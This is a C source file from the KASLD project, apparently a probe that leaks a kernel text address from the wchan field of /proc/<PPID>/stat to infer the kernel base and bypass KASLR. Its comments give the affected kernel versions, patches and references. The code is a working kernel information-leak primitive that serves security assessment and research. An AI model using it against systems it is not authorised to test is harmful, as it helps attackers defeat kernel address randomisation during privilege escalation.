// This file is part of KASLD - https://github.com/bcoles/kasld
//
// Leak the parent process waiting kernel function virtual address
// from /proc/<PPID>/stat wait channel 'wchan' field.
//
// Patched in kernel v4.4-rc1~160 on 2015-10-01:
// https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=b2f73922d119686323f14fbbe46587f863852328
//
// Partially reintroduced in kernel v5.12-rc1-dontuse~27^2~35 on 2021-02-25:
// https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/fs/proc/base.c?id=152c432b128cb043fc107e8f211195fe94b2159c
//
// Regression was later reverted in kernel v5.16-rc1~197^2~21 on 2021-10-15:
// https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/fs/proc/base.c?id=54354c6a9f7fd5572d2b9ec108117c4f376d4d23
//
// Leak primitive:
//   Data leaked:      kernel function virtual address (wait channel)
//   Kernel subsystem: fs/proc — /proc/<PID>/stat field 34 (wchan)
//   Data structure:   task_struct → last sleeping kernel function address
//   Address type:     virtual (kernel text)
//   Method:           parsed (field 34 of stat file)
//   Patched:          v4.4 (commit b2f73922d119)
//   Status:           fixed in v4.4; regressed v5.12–v5.15; re-fixed v5.16
//   Access check:     none pre-v4.4 (world-readable /proc/<PID>/stat field 34)
//   Source: https://elixir.bootlin.com/linux/v4.3/source/fs/proc/array.c
//
// Mitigations:
//   Patched in v4.4 (wchan zeroed for non-root). Regression in v5.12
//   re-exposed wchan; reverted in v5.16. No runtime sysctl can
//   restrict access.
//
// References:
// https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=b2f73922d119686323f14fbbe46587f863852328
// https://www.cr0.org/paper/to-jt-linux-alsr-leak.pdf
// https://marcograss.github.io/security/linux/2016/01/24/exploiting-infoleak-linux-kaslr-bypass.html
// ---
// <bcoles@gmail.com>

#include "include/kasld/api.h"
#include "include/kasld/cli.h"
#include <errno.h>
#include <inttypes.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <unistd.h>

KASLD_EXPLAIN(
    "Reads the wchan (wait channel) field from /proc/<PPID>/stat, which "
    "reports the kernel text virtual address where a process is sleeping. "
    "Before v4.4, this was an unfiltered kernel pointer. Fixed in v4.4 "
    "by zeroing the field; regressed in v5.12-v5.15 where the raw "
    "address was again exposed, then re-fixed in v5.16.");

KASLD_META("method:parsed\n"
           "phase:inference\n"
           "live:1\n"
           "addr:virtual\n"
           "patch:v4.4\n");

static unsigned long get_kernel_addr_proc_stat_wchan(void) {
  FILE *f;
  char path[32];
  unsigned long addr = 0;
  char buff[BUFSIZ];
  char delim[] = " ";
  char *ptr;
  char *endptr;

  snprintf(path, sizeof(path), "/proc/%d/stat", (pid_t)getppid());

  kasld_info("checking %s 'wchan' field ...", path);

  f = kasld_fopen(path, "rb");
  if (f == NULL) {
    perror("[-] fopen");
    return 0;
  }

  if (fgets(buff, BUFSIZ, f) == NULL) {
    perror("[-] fgets");
    return 0;
  }

  /* wchan is field 34 in /proc/PID/stat. Field 2 (comm) is wrapped in
   * parentheses and may contain spaces, so find the last ')' first,
   * then count space-delimited fields from field 3 onwards.
   * wchan = field 34 = 32nd token after ')'. */
  ptr = strrchr(buff, ')');
  if (!ptr) {
    kasld_err("failed to parse stat (no comm field)");
    fclose(f);
    return 0;
  }
  ptr++; /* skip ')' */

  int field = 3; /* first token after ')' is field 3 (state) */
  ptr = strtok(ptr, delim);
  while (ptr != NULL) {
    if (field == 34) {
      addr = strtoul(ptr, &endptr, 10);
      if (!kasld_addr_is_kernel_text(addr))
        addr = 0;
      break;
    }
    field++;
    ptr = strtok(NULL, delim);
  }

  fclose(f);

  return addr;
}

int main(void) {
  if (kasld_skip_live_probe("wchan"))
    return 0;
  unsigned long addr = get_kernel_addr_proc_stat_wchan();
  if (!addr) {
    kasld_err("no kernel address found in /proc/pid/stat wchan");
    return 0;
  }

  kasld_found("leaked wchan address: %lx", addr);
  kasld_info("possible kernel base: %lx", kasld_floor_text_base(addr));
  kasld_result_sample(KASLD_TYPE_VIRT, REGION_KERNEL_TEXT, addr, NULL,
                      CONF_PARSED);

  return 0;
}
